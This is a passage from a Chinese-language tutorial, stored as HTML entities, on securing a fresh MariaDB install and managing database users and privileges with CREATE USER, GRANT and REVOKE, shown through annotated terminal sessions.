&#x8BBE;&#x7F6E;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;&#x503C;&#xFF08;&#x6CE8;&#x610F;&#xFF0C;&#x8BE5;&#x5BC6;&#x7801;&#x5E76;&#x975E;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;&#x5BC6;&#x7801;&#x503C;&#x9ED8;&#x8BA4;&#x5E94;&#x8BE5;&#x4E3A;&#x7A7A;&#xFF0C;&#x53EF;&#x76F4;&#x63A5;&#x6309;&#x56DE;&#x8F66;&#x952E;&#xFF09;&#x3002; &#x8BBE;&#x7F6E;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x4E13;&#x6709;&#x5BC6;&#x7801;&#x3002; &#x968F;&#x540E;&#x5220;&#x9664;&#x533F;&#x540D;&#x8D26;&#x6237;&#xFF0C;&#x7981;&#x6B62;root&#x7BA1;&#x7406;&#x5458;&#x4ECE;&#x8FDC;&#x7A0B;&#x767B;&#x5F55; &#x5220;&#x9664;&#x9ED8;&#x8BA4;&#x7684;&#x6D4B;&#x8BD5;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x53D6;&#x6D88;&#x6D4B;&#x8BD5;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E00;&#x7CFB;&#x5217;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#x3002; &#x5237;&#x65B0;&#x6388;&#x6743;&#x5217;&#x8868;&#xFF0C;&#x8BA9;&#x521D;&#x59CB;&#x5316;&#x7684;&#x8BBE;&#x5B9A;&#x7ACB;&#x5373;&#x751F;&#x6548;&#x3002;&#x5BF9;&#x4E8E;&#x4E0A;&#x8FF0;&#x6570;&#x636E;&#x5E93;&#x521D;&#x59CB;&#x5316;&#x7684;&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;&#xFF0C;&#x8001;&#x5E08;&#x5DF2;&#x7ECF;&#x5728;&#x4E0B;&#x9762;&#x7684;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x65C1;&#x8FB9;&#x8FDB;&#x884C;&#x4E86;&#x7B80;&#x5355;&#x6CE8;&#x91CA;&#xFF0C;&#x786E;&#x4FDD;&#x5404;&#x4F4D;&#x8BFB;&#x8005;&#x66F4;&#x76F4;&#x89C2;&#x5730;&#x4E86;&#x89E3;&#x8981;&#x8F93;&#x5165;&#x7684;&#x5185;&#x5BB9;&#xFF1A; 123456789101112131415161718192021222324252627282930313233343536373839404142434445[root@jaking ~]# mysql_secure_installation /usr/bin/mysql_secure_installation: line 379: find_mysql_client: command not foundNOTE: RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MariaDB&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; SERVERS IN PRODUCTION USE!&#xA0; PLEASE READ EACH STEP CAREFULLY!In order to log into MariaDB to secure it, we&apos;ll need the currentpassword for the root user.&#xA0; If you&apos;ve just installed MariaDB, andyou haven&apos;t set the root password yet, the password will be blank,so you should just press enter here.Enter current password for root (enter for none): &#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x5BC6;&#x7801;&#x4E3A;&#x7A7A;&#xFF0C;&#x76F4;&#x63A5;&#x6309;&#x56DE;&#x8F66;&#x952E;OK, successfully used password, moving on...Setting the root password ensures that nobody can log into the MariaDBroot user without the proper authorisation.Set root password? [Y/n] yNew password:&#x8F93;&#x5165;&#x8981;&#x4E3A;root&#x7BA1;&#x7406;&#x5458;&#x8BBE;&#x7F6E;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5BC6;&#x7801;Re-enter new password:&#x518D;&#x6B21;&#x8F93;&#x5165;&#x5BC6;&#x7801;Password updated successfully!Reloading privilege tables..&#xA0;... Success!By default, a MariaDB installation has an anonymous user, allowing anyoneto log into MariaDB without having to have a user account created forthem.&#xA0; This is intended only for testing, and to make the installationgo a bit smoother.&#xA0; You should remove them before moving into aproduction environment.Remove anonymous users? [Y/n] y&#xFF08;&#x5220;&#x9664;&#x533F;&#x540D;&#x8D26;&#x6237;&#xFF09;... Success!Normally, root should only be allowed to connect from &apos;localhost&apos;.&#xA0; Thisensures that someone cannot guess at the root password from the network.Disallow root login remotely? [Y/n] y&#xFF08;&#x7981;&#x6B62;root&#x7BA1;&#x7406;&#x5458;&#x4ECE;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#xFF09;&#xA0;... Success!By default, MariaDB comes with a database named &apos;test&apos; that anyone canaccess.&#xA0; This is also intended only for testing, and should be removedbefore moving into a production environment.Remove test database and access to it? [Y/n] y&#xFF08;&#x5220;&#x9664;test&#x6570;&#x636E;&#x5E93;&#x5E76;&#x53D6;&#x6D88;&#x5BF9;&#x5B83;&#x7684;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#xFF09;&#xA0;- Dropping test database...&#xA0;... Success!&#xA0;- Removing privileges on test database...&#xA0;... Success!Reloading the privilege tables will ensure that all changes made so farwill take effect immediately.Reload privilege tables now? [Y/n] y&#xFF08;&#x5237;&#x65B0;&#x6388;&#x6743;&#x8868;&#xFF0C;&#x8BA9;&#x521D;&#x59CB;&#x5316;&#x540E;&#x7684;&#x8BBE;&#x5B9A;&#x7ACB;&#x5373;&#x751F;&#x6548;&#xFF09;&#xA0;... Success!Cleaning up...All done!&#xA0; If you&apos;ve completed all of the above steps, your MariaDBinstallation should now be secure.Thanks for using MariaDB! &#x5728;&#x5F88;&#x591A;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#x90FD;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x7AD9;&#x5E93;&#x5206;&#x79BB;&#x7684;&#x6280;&#x672F;&#xFF08;&#x5373;&#x7F51;&#x7AD9;&#x548C;&#x6570;&#x636E;&#x5E93;&#x4E0D;&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x8BA9;root&#x7BA1;&#x7406;&#x5458;&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x53EF;&#x5728;&#x4E0A;&#x9762;&#x7684;&#x521D;&#x59CB;&#x5316;&#x64CD;&#x4F5C;&#x4E2D;&#x8BBE;&#x7F6E;&#x7B56;&#x7565;&#xFF0C;&#x4EE5;&#x5141;&#x8BB8;root&#x7BA1;&#x7406;&#x5458;&#x4ECE;&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;&#x3002;&#x7136;&#x540E;&#x8FD8;&#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x9632;&#x706B;&#x5899;&#xFF0C;&#x4F7F;&#x5176;&#x653E;&#x884C;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x8BBF;&#x95EE;&#x8BF7;&#x6C42;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x9ED8;&#x8BA4;&#x4F1A;&#x5360;&#x7528;3306&#x7AEF;&#x53E3;&#xFF0C;&#x5728;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x4E2D;&#x670D;&#x52A1;&#x540D;&#x79F0;&#x7EDF;&#x4E00;&#x53EB;&#x4F5C;mysql&#xFF1A; 1234[root@jaking ~]# firewall-cmd --permanent --add-service=mysqlsuccess[root@jaking ~]# firewall-cmd --reloadsuccess &#x4E00;&#x5207;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#x3002;&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x5C06;&#x9996;&#x6B21;&#x767B;&#x5F55;MariaDB&#x6570;&#x636E;&#x5E93;&#x3002;&#x5176;&#x4E2D;&#xFF0C;-u&#x53C2;&#x6570;&#x7528;&#x6765;&#x6307;&#x5B9A;&#x4EE5;root&#x7BA1;&#x7406;&#x5458;&#x7684;&#x8EAB;&#x4EFD;&#x767B;&#x5F55;&#xFF0C;&#x800C;-p&#x53C2;&#x6570;&#x7528;&#x6765;&#x9A8C;&#x8BC1;&#x8BE5;&#x7528;&#x6237;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;&#x503C;&#x3002; 12345678[root@jaking ~]# mysql -u root -pEnter password: &#x6B64;&#x5904;&#x8F93;&#x5165;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;Welcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 5Server version: 5.5.35-MariaDB MariaDB ServerCopyright (c) 2000, 2013, Oracle, Monty Program Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; &#x5728;&#x767B;&#x5F55;MariaDB&#x6570;&#x636E;&#x5E93;&#x540E;&#x6267;&#x884C;&#x6570;&#x636E;&#x5E93;&#x547D;&#x4EE4;&#x65F6;&#xFF0C;&#x90FD;&#x9700;&#x8981;&#x5728;&#x547D;&#x4EE4;&#x540E;&#x9762;&#x7528;&#x5206;&#x53F7;&#xFF08;;&#xFF09;&#x7ED3;&#x5C3E;&#xFF0C;&#x8FD9;&#x4E5F;&#x662F;&#x4E0E;Linux&#x547D;&#x4EE4;&#x6700;&#x663E;&#x8457;&#x7684;&#x533A;&#x522B;&#x3002;&#x5927;&#x5BB6;&#x9700;&#x8981;&#x6162;&#x6162;&#x4E60;&#x60EF;&#x6570;&#x636E;&#x5E93;&#x547D;&#x4EE4;&#x7684;&#x8FD9;&#x79CD;&#x8BBE;&#x5B9A;&#x3002;&#x4E0B;&#x9762;&#x6267;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E2D;&#x5F53;&#x524D;&#x90FD;&#x6709;&#x54EA;&#x4E9B;&#x6570;&#x636E;&#x5E93;&#xFF1A; 123456789MariaDB [(none)]&gt; SHOW databases;+--------------------+| Database&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |+--------------------+| information_schema || mysql&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || performance_schema |+--------------------+3 rows in set (0.01 sec) &#x5C0F;&#x8BD5;&#x725B;&#x5200;&#x8FC7;&#x540E;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x4F7F;&#x7528;&#x6570;&#x636E;&#x5E93;&#x547D;&#x4EE4;&#x5C06;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x5BC6;&#x7801;&#x503C;&#x4FEE;&#x6539;&#x4E3A;jaking&#x3002;&#x8FD9;&#x6837;&#x9000;&#x51FA;&#x540E;&#x518D;&#x5C1D;&#x8BD5;&#x767B;&#x5F55;&#xFF0C;&#x5982;&#x679C;&#x8FD8;&#x575A;&#x6301;&#x8F93;&#x5165;&#x539F;&#x5148;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x5219;&#x5C06;&#x63D0;&#x793A;&#x8BBF;&#x95EE;&#x5931;&#x8D25;&#x3002; 123456789MariaDB [(none)]&gt; SET password = PASSWORD(&apos;jaking&apos;);Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; use mysql #&#x5207;&#x6362;&#x5230;mysql&#x5E93;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [mysql]&gt; exitBye 12345678910111213141516171819[root@jaking ~]# mysql -u root -pEnter password:&#x6B64;&#x5904;&#x5E94;&#x8BE5;&#x8F93;&#x5165;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x65B0;&#x5BC6;&#x7801;ERROR 1045 (28000): Access denied for user &apos;root&apos;@&apos;localhost&apos; (using password: YES)[root@jaking ~]# mysql -uroot -pjakingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 17Server version: 5.5.68-MariaDB MariaDB ServerCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; SET password = PASSWORD(&apos;123456&apos;);Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; exitBye[root@jaking ~]# 3 &#x7BA1;&#x7406;&#x7528;&#x6237;&#x4EE5;&#x53CA;&#x6388;&#x6743;&#x5728;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#x603B;&#x4E0D;&#x80FD;&#x4E00;&#x76F4;&#x201C;&#x6B7B;&#x5543;&#x201D;root&#x7BA1;&#x7406;&#x5458;&#x3002;&#x4E3A;&#x4E86;&#x4FDD;&#x969C;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#x7684;&#x5B89;&#x5168;&#x6027;&#xFF0C;&#x4EE5;&#x53CA;&#x8BA9;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x534F;&#x540C;&#x7BA1;&#x7406;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E2D;&#x4E3A;&#x4ED6;&#x4EEC;&#x521B;&#x5EFA;&#x591A;&#x4E2A;&#x4E13;&#x7528;&#x7684;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x8D26;&#x6237;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x5206;&#x914D;&#x5408;&#x7406;&#x7684;&#x6743;&#x9650;&#xFF0C;&#x4EE5;&#x6EE1;&#x8DB3;&#x4ED6;&#x4EEC;&#x7684;&#x5DE5;&#x4F5C;&#x9700;&#x6C42;&#x3002;&#x4E3A;&#x6B64;&#xFF0C;&#x53EF;&#x4F7F;&#x7528;root&#x7BA1;&#x7406;&#x5458;&#x767B;&#x5F55;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#xFF0C;&#x7136;&#x540E;&#x6309;&#x7167;&#x201C;CREATE USER &#x7528;&#x6237;&#x540D;@&#x4E3B;&#x673A;&#x540D; IDENTIFIED BY &#x2018;&#x5BC6;&#x7801;&#x2019;; &#x201D;&#x7684;&#x683C;&#x5F0F;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x8D26;&#x6237;&#x3002;&#x518D;&#x6B21;&#x63D0;&#x9192;&#x5927;&#x5BB6;&#xFF0C;&#x4E00;&#x5B9A;&#x4E0D;&#x8981;&#x5FD8;&#x8BB0;&#x6BCF;&#x6761;&#x6570;&#x636E;&#x5E93;&#x547D;&#x4EE4;&#x540E;&#x9762;&#x7684;&#x5206;&#x53F7;&#xFF08;;&#xFF09;&#x3002; 12MariaDB [(none)]&gt; CREATE USER jaking@localhost IDENTIFIED BY &apos;jaking&apos;;Query OK, 0 rows affected (0.00 sec) &#x521B;&#x5EFA;&#x7684;&#x8D26;&#x6237;&#x4FE1;&#x606F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;select&#x547D;&#x4EE4;&#x8BED;&#x53E5;&#x6765;&#x67E5;&#x8BE2;&#x3002;&#x4E0B;&#x9762;&#x547D;&#x4EE4;&#x67E5;&#x8BE2;&#x7684;&#x662F;&#x8D26;&#x6237;jaking&#x7684;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#x3001;&#x8D26;&#x6237;&#x540D;&#x79F0;&#x4EE5;&#x53CA;&#x7ECF;&#x8FC7;&#x52A0;&#x5BC6;&#x7684;&#x5BC6;&#x7801;&#x503C;&#x4FE1;&#x606F;&#xFF1A;12345678910MariaDB [(none)]&gt; use mysqlReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [mysql]&gt; SELECT HOST,USER,PASSWORD FROM user WHERE USER=&quot;jaking&quot;;+-----------+------+-------------------------------------------+| host&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | user | password&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;|+-----------+------+-------------------------------------------+| localhost | jaking | *55D9962586BE75F4B7D421E6655973DB07D6869F |+-----------+------+-------------------------------------------+ &#x4E0D;&#x8FC7;&#xFF0C;&#x7528;&#x6237;jaking&#x4EC5;&#x4EC5;&#x662F;&#x4E00;&#x4E2A;&#x666E;&#x901A;&#x8D26;&#x6237;&#xFF0C;&#x6CA1;&#x6709;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4EFB;&#x4F55;&#x64CD;&#x4F5C;&#x6743;&#x9650;&#x3002;&#x4E0D;&#x4FE1;&#x7684;&#x8BDD;&#xFF0C;&#x53EF;&#x4EE5;&#x5207;&#x6362;&#x5230;jaking&#x8D26;&#x6237;&#x6765;&#x67E5;&#x8BE2;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E2D;&#x5F53;&#x524D;&#x90FD;&#x6709;&#x54EA;&#x4E9B;&#x6570;&#x636E;&#x5E93;&#x3002;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x8BE5;&#x8D26;&#x6237;&#x751A;&#x81F3;&#x6CA1;&#x6CD5;&#x67E5;&#x770B;&#x5B8C;&#x6574;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5217;&#x8868;&#xFF08;&#x521A;&#x624D;&#x4F7F;&#x7528;root&#x8D26;&#x6237;&#x65F6;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x5230;3&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x5217;&#x8868;&#xFF09;&#xFF1A; 12345678910111213141516MariaDB [mysql]&gt; exitBye[root@jaking ~]# mysql -u jaking -pEnter password: &#x6B64;&#x5904;&#x8F93;&#x5165;jaking&#x8D26;&#x6237;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5BC6;&#x7801;Welcome to the MariaDB monitor.&#xA0; Commands end with ; or \\g.Your MariaDB connection id is 6Server version: 5.5.35-MariaDB MariaDB ServerCopyright (c) 2000, 2013, Oracle, Monty Program Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; show databases;+--------------------+| Database &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;|+--------------------+| information_schema |+--------------------+1 row in set (0.03 sec) &#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x547D;&#x4EE4;&#x4E00;&#x822C;&#x90FD;&#x6BD4;&#x8F83;&#x590D;&#x6742;&#x3002;&#x6211;&#x4EEC;&#x4EE5;grant&#x547D;&#x4EE4;&#x4E3A;&#x4F8B;&#x8FDB;&#x884C;&#x8BF4;&#x660E;&#x3002;grant&#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x4E3A;&#x8D26;&#x6237;&#x8FDB;&#x884C;&#x6388;&#x6743;&#xFF0C;&#x5176;&#x5E38;&#x89C1;&#x683C;&#x5F0F;&#x5982;&#x8868;1&#x6240;&#x793A;&#x3002;&#x5728;&#x4F7F;&#x7528;grant&#x547D;&#x4EE4;&#x65F6;&#x9700;&#x8981;&#x5199;&#x4E0A;&#x8981;&#x8D4B;&#x4E88;&#x7684;&#x6743;&#x9650;&#x3001;&#x6570;&#x636E;&#x5E93;&#x53CA;&#x8868;&#x5355;&#x540D;&#x79F0;&#xFF0C;&#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x8D26;&#x6237;&#x53CA;&#x4E3B;&#x673A;&#x4FE1;&#x606F;&#x3002;&#x5176;&#x5B9E;&#xFF0C;&#x53EA;&#x8981;&#x7406;&#x89E3;&#x4E86;&#x547D;&#x4EE4;&#x4E2D;&#x6BCF;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x529F;&#x80FD;&#x542B;&#x4E49;&#xFF0C;&#x4E5F;&#x5C31;&#x4E0D;&#x89C9;&#x5F97;&#x547D;&#x4EE4;&#x590D;&#x6742;&#x96BE;&#x61C2;&#x4E86;&#x3002; &#x8868;1. GRANT&#x547D;&#x4EE4;&#x7684;&#x5E38;&#x89C1;&#x683C;&#x5F0F;&#x4EE5;&#x53CA;&#x89E3;&#x91CA; &#x547D;&#x4EE4; &#x4F5C;&#x7528; GRANT &#x6743;&#x9650; ON &#x6570;&#x636E;&#x5E93;.&#x8868;&#x5355;&#x540D;&#x79F0; TO &#x7528;&#x6237;@&#x4E3B;&#x673A;&#x540D; &#x5BF9;&#x67D0;&#x4E2A;&#x7279;&#x5B9A;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x7279;&#x5B9A;&#x8868;&#x5355;&#x7ED9;&#x4E88;&#x6388;&#x6743; GRANT &#x6743;&#x9650; ON &#x6570;&#x636E;&#x5E93;.* TO &#x7528;&#x6237;&#x540D;@&#x4E3B;&#x673A;&#x540D; &#x5BF9;&#x67D0;&#x4E2A;&#x7279;&#x5B9A;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x8868;&#x5355;&#x7ED9;&#x4E88;&#x6388;&#x6743; GRANT &#x6743;&#x9650; ON . TO &#x7528;&#x6237;&#x540D;@&#x4E3B;&#x673A;&#x540D; &#x5BF9;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x53CA;&#x6240;&#x6709;&#x8868;&#x5355;&#x7ED9;&#x4E88;&#x6388;&#x6743; GRANT &#x6743;&#x9650;1,&#x6743;&#x9650;2 ON &#x6570;&#x636E;&#x5E93;.* TO &#x7528;&#x6237;&#x540D;@&#x4E3B;&#x673A;&#x540D; &#x5BF9;&#x67D0;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x8868;&#x5355;&#x7ED9;&#x4E88;&#x591A;&#x4E2A;&#x6388;&#x6743; GRANT ALL PRIVILEGES ON . TO &#x7528;&#x6237;&#x540D;@&#x4E3B;&#x673A;&#x540D; &#x5BF9;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x53CA;&#x6240;&#x6709;&#x8868;&#x5355;&#x7ED9;&#x4E88;&#x5168;&#x90E8;&#x6388;&#x6743;&#xFF08;&#x9700;&#x8C28;&#x614E;&#x64CD;&#x4F5C;&#xFF09; &#x5F53;&#x7136;&#xFF0C;&#x8D26;&#x6237;&#x7684;&#x6388;&#x6743;&#x5DE5;&#x4F5C;&#x80AF;&#x5B9A;&#x662F;&#x9700;&#x8981;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x5458;&#x6765;&#x6267;&#x884C;&#x7684;&#x3002;&#x4E0B;&#x9762;&#x4EE5;root&#x7BA1;&#x7406;&#x5458;&#x7684;&#x8EAB;&#x4EFD;&#x767B;&#x5F55;&#x5230;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x9488;&#x5BF9;mysql&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;user&#x8868;&#x5355;&#x5411;&#x8D26;&#x6237;jaking&#x6388;&#x4E88;&#x67E5;&#x8BE2;&#x3001;&#x66F4;&#x65B0;&#x3001;&#x5220;&#x9664;&#x4EE5;&#x53CA;&#x63D2;&#x5165;&#x7B49;&#x6743;&#x9650;&#x3002;&#x6388;&#x6743;&#x64CD;&#x4F5C;&#x6267;&#x884C;&#x540E;&#x6765;&#x67E5;&#x770B;&#x4E0B;jaking&#x7528;&#x6237;&#x7684;&#x6743;&#x9650;&#x5427;&#xFF1A;12345678[root@jaking ~]# mysql -u root -pEnter password:&#x6B64;&#x5904;&#x8F93;&#x5165;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;MariaDB [(none)]&gt; use mysql;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [mysql]&gt; GRANT SELECT,UPDATE,DELETE,INSERT ON mysql.user TO jaking@localhost;Query OK, 0 rows affected (0.00 sec) &#x5728;&#x6267;&#x884C;&#x5B8C;&#x4E0A;&#x8FF0;&#x6388;&#x6743;&#x64CD;&#x4F5C;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x518D;&#x67E5;&#x770B;&#x4E00;&#x4E0B;&#x8D26;&#x6237;jaking&#x7684;&#x6743;&#x9650;&#xFF1A;12345678MariaDB [(none)]&gt; SHOW GRANTS FOR jaking@localhost;+-------------------------------------------------------------------------------------------------------------+| Grants for jaking@localhost |+-------------------------------------------------------------------------------------------------------------+| GRANT USAGE ON *.* TO &apos;jaking&apos;@&apos;localhost&apos; IDENTIFIED BY PASSWORD &apos;*55D9962586BE75F4B7D421E6655973DB07D6869F&apos; || GRANT SELECT, INSERT, UPDATE, DELETE ON `mysql`.`user` TO &apos;jaking&apos;@&apos;localhost&apos; |+-------------------------------------------------------------------------------------------------------------+2 rows in set (0.00 sec) &#x4E0A;&#x9762;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x4E2D;&#x663E;&#x793A;&#x8D26;&#x6237;jaking&#x5DF2;&#x7ECF;&#x62E5;&#x6709;&#x4E86;&#x9488;&#x5BF9;mysql&#x6570;&#x636E;&#x5E93;&#x4E2D;user&#x8868;&#x5355;&#x7684;&#x4E00;&#x7CFB;&#x5217;&#x6743;&#x9650;&#x4E86;&#x3002;&#x8FD9;&#x65F6;&#x6211;&#x4EEC;&#x518D;&#x5207;&#x6362;&#x5230;&#x8D26;&#x6237;jaking&#xFF0C;&#x6B64;&#x65F6;&#x5C31;&#x80FD;&#x591F;&#x770B;&#x5230;mysql&#x6570;&#x636E;&#x5E93;&#x4E86;&#xFF0C;&#x800C;&#x4E14;&#x8FD8;&#x80FD;&#x770B;&#x5230;&#x8868;&#x5355;user&#xFF08;&#x5176;&#x4F59;&#x8868;&#x5355;&#x4F1A;&#x56E0;&#x65E0;&#x6743;&#x9650;&#x800C;&#x88AB;&#x7EE7;&#x7EED;&#x9690;&#x85CF;&#xFF09;&#xFF1A; 1234567891011121314151617181920212223[root@jaking ~]# mysql -u jaking -pEnter password:&#x6B64;&#x5904;&#x8F93;&#x5165;jaking&#x7528;&#x6237;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;MariaDB [(none)]&gt; show databases;+--------------------+| Database&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |+--------------------+| information_schema || mysql&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |+--------------------+2 rows in set (0.01 sec)MariaDB [(none)]&gt; use mysqlReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [mysql]&gt; SHOW TABLES;+-----------------+| Tables_in_mysql |+-----------------+| user&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |+-----------------+1 row in set (0.01 sec)MariaDB [mysql]&gt; exitBye &#x5927;&#x5BB6;&#x4E0D;&#x8981;&#x5FC3;&#x6025;&#xFF0C;&#x6211;&#x4EEC;&#x63A5;&#x4E0B;&#x6765;&#x4F1A;&#x6162;&#x6162;&#x5B66;&#x4E60;&#x6570;&#x636E;&#x5E93;&#x5185;&#x5BB9;&#x7684;&#x4FEE;&#x6539;&#x65B9;&#x6CD5;&#x3002;&#x5F53;&#x524D;&#xFF0C;&#x5148;&#x5207;&#x6362;&#x56DE;root&#x8D26;&#x6237;&#xFF0C;&#x79FB;&#x9664;&#x521A;&#x624D;&#x7684;&#x6388;&#x6743;&#x3002; 123456789101112131415161718192021222324252627282930313233343536373839[root@jaking ~]# mysql -u root -pEnter password:&#x6B64;&#x5904;&#x8F93;&#x5165;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;MariaDB [(none)]&gt; use mysql;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [(mysql)]&gt; REVOKE SELECT,UPDATE,DELETE,INSERT ON mysql.user FROM jaking@localhost;Query OK, 0 rows affected (0.00 